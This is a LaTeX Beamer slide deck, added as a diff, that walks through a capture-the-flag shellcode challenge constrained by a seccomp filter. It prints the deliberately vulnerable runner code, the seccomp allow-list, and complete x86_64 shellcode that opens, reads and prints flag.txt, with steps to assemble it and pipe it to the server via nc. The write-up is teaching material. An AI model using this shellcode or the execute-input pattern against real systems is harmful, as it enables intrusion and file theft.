@@ -1,0 +1,296 @@
+\documentclass{beamer}
+
+\usepackage[utf8]{inputenc}
+\usetheme{Warsaw}
+\mode<presentation>{}
+\setlength{\parskip}{\baselineskip} 
+
+\usepackage{listings}
+\lstset
+{
+    language=C,
+    numbers=left,
+    basicstyle=\tiny
+}
+
+\title{Shellcode/Seccomp CTF Writeup}
+\author{Jake Drahos}
+
+
+\begin{document}
+
+\begin{frame}
+{Setup}
+
+Provided at beginning of CTF
+\begin{itemize}
+ \item Source Code
+ \item Binary
+\end{itemize}
+\end{frame}
+
+\begin{frame}
+  A note on ``shell''/``pwn''-style CTFs:
+  
+  \pause
+  Exploit needed on the server to avoid offline 
+  analysis/{\tt strings} shenanigans
+  
+  It will be running with something like 
+  {\tt \$ socat TCP-LISTEN:4444,fork,reuseaddr EXEC:./pwnable.elf }
+  
+  Simplest way to redirect stdin/stdout to a socket - can treat the 
+  netcat command the same as running the exe locally*.
+  
+  Achieve the behavior locally, then provide the same input to the server.
+  
+\end{frame}
+
+\begin{frame}
+{Tools}
+Tools used in this solve:
+\begin{itemize}
+ \item A text editor
+ \item gcc (as an assembler)
+ \item objcopy(1)
+ \item objdump (optional)
+\end{itemize}
+\end{frame}
+
+\section{Source Code Breakdown}
+
+\begin{frame}[fragile]
+{Process setup}
+Unbuffered IO (for socat and especially for segfaults)
+
+\begin{itemize}
+ \item stdout buffered by libc (in userspace) until a newline
+ \item libc will also flush on a call to flush() or graceful exit
+ \item Not on a segfault!
+ \item Worse yet: when stdout is not a tty (eg. a pipe - {\tt socat}), block buffering
+ \item Solution: setvbuf(3)
+\end{itemize}
+
+
+    \begin{lstlisting}[firstnumber=41]
+static void process_setup()
+{
+    setvbuf(stdout, NULL, _IONBF, 0);
+    \end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]
+ Allocate a page for shellcode and make it executable
+    \begin{lstlisting}[firstnumber=50]
+      pagesize = sysconf(_SC_PAGE_SIZE);
+
+      shellcode = memalign(pagesize,  pagesize);
+      if (shellcode == NULL) {
+            perror("memalign");
+            exit(1);
+      }
+
+
+      if (mprotect(shellcode, pagesize, PROT_READ|PROT_WRITE|PROT_EXEC)) {
+            perror("mprotect");
+            exit(1);
+      }
+    \end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]
+ Binary equivalent of exec(readline())
+ \begin{lstlisting}[firstnumber=34]
+      puts("Ready to receive shellcode...");
+      read(STDIN_FILENO, shellcode, pagesize);
+
+      puts("Executing shellcode...");
+      ((void (*)(void)) shellcode)();
+ \end{lstlisting}
+
+ \pause Getting the syntax right on the first try feels {\it really} good.
+\end{frame}
+
+\section{Payload}
+
+\begin{frame}[fragile]
+Just grab an {\tt execve(``/bin/sh'')} payload from ShellStorm!
+
+\pause It won't work.
+\pause Seccomp will ruin your day.
+ 
+\end{frame}
+
+\begin{frame}[fragile]
+{\tt seccomp(2)} 
+ \begin{lstlisting}[firstnumber=66]
+  struct sock_filter filter[] = {
+      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, arch))),
+      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, FILTER_ARCH, 1, 0),
+      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (EPERM & SECCOMP_RET_DATA)),
+      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
+      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_read, 0, 1),
+      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
+      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
+      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_write, 0, 1),
+      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
+      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
+      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_writev, 0, 1),
+      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
+      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
+      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_open, 0, 1),
+      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
+      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
+      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_openat, 0, 1),
+      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
+      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
+      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_exit, 0, 1),
+      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
+      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (EPERM & SECCOMP_RET_DATA)),
+  };
+ \end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]
+{Allowed syscalls}
+
+{\tt open(2), read(2), write(2)} are available, and the flag file is known:
+
+\begin{lstlisting}[firstnumber=104]
+        int fd = open("flag.txt", O_RDONLY);
+\end{lstlisting}
+
+Open the flag, read it into a buffer, then write the buffer to stdout (fd 1)
+
+\end{frame}
+
+\begin{frame}
+{x86\_64 calling convention}
+ 
+ {\tt syscall(\%rdi, \%rsi, \%rdx, \%r10)}
+ 
+ syscall number in \%rax
+ 
+ \begin{itemize}
+  \item open: 2
+  \item read: 0
+  \item write: 1
+  \item exit: 60
+ \end{itemize}
+ 
+\end{frame}
+
+
+\subsection{Open the flag}
+
+\begin{frame}[fragile]
+    {\tt rax = open(flag, 0, 0) }
+    
+    \begin{lstlisting}[firstnumber=1]
+.section .text
+    lea     flag(%rip), %rax
+    mov     %rax, %rdi
+    mov     $0, %rsi
+    mov     $0, %rdx
+    mov     $2, %rax
+    syscall
+    \end{lstlisting}
+    
+    
+    {\tt flag} is a label - instruction-pointer relative (PIC)
+\end{frame}
+
+\subsection{Read into buffer}
+
+
+\begin{frame}[fragile]
+    {\tt read(rax, rsp, 128)}
+
+    \begin{lstlisting}[firstnumber=9]
+    mov     %rax, %rdi
+    mov     %rsp, %rsi
+    mov     $128, %rdx
+    mov     $0, %rax
+    syscall
+    \end{lstlisting}
+
+Just use the SP as a buffer (it's free real estate)
+\end{frame}
+
+\subsection{Write to stdout}
+\begin{frame}[fragile]
+    {\tt write(1, rsp, 128)}
+    
+    \begin{lstlisting}[firstnumber= 15]
+    mov     $1, %rdi
+    mov     %rax, %rdx
+    mov     $1, %rax
+    syscall
+
+    mov     $60, %rax
+    syscall
+    
+flag:
+    .string "flag.txt"
+
+    \end{lstlisting}
+    
+    Bonus: {\tt exit()} at the end, then tack on the 
+    string literal.
+
+\end{frame}
+
+\section{Exploit!}
+
+\begin{frame}
+ {Assemble the payload}
+ 
+ Use {\tt as} or {\tt gcc}.
+ GCC can detect assembly input (.s extension) and will treat it appropriately.
+ 
+ \pause
+ 
+ {\tt gcc -c payload.s}
+ 
+ {\tt as -o payload.o payload.s}
+ 
+ Obtain a {\tt payload.o} ELF object.
+\end{frame}
+
+\begin{frame}
+ {Who needs a linker?}
+ 
+ The code is already position-independent and relies on no external symbols.
+ 
+ {\tt objdump -r payload-x86\_64.o} outputs no relocation entries
+ 
+ No need to get a linker script involved
+ 
+ {\tt objcopy -O binary -j .text payload.o payload.bin }
+ 
+ Extracts the raw contents of the .text section as binay data
+\end{frame}
+
+\begin{frame}
+ {PWN!}
+ 
+ {\tt ./runner.elf < payload-x86\_64.bin }
+ 
+ Or for realsies
+ 
+ {\tt nc ip < payload-x86\_64.bin }
+\end{frame}
+
+\begin{frame}
+ {Sources}
+ https://github.com/drahosj/shellcode-ctf 
+ 
+ Includes source/binary for runner, a Makefile (may need tweaking to recompile runner),
+ and two payloads (non-working exec-based, and working).
+ 
+ Run make to build the payloads, and the examples should work.
+\end{frame}
+
+
+
+\end{document}
